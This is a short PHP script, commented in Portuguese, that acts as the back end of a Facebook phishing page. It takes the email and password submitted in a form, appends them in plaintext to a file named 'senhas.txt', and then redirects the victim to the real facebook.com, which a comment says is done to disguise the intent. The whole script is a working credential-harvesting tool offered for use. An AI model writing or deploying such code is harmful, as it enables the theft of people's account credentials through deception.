<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $senha = $_POST['senha'];
    
    // Aqui você pode adicionar o código para armazenar os dados em um arquivo ou banco de dados
    // Por exemplo, para armazenar em um arquivo de texto:
    $arquivo = fopen("senhas.txt", "a");
    fwrite($arquivo, "Email: " . $email . " - Senha: " . $senha . "\n");
    fclose($arquivo);

    // Redirecionar para a página de login real do Facebook para disfarçar sua intenção
    header("Location: https://facebook.com");
    exit();
}
?>
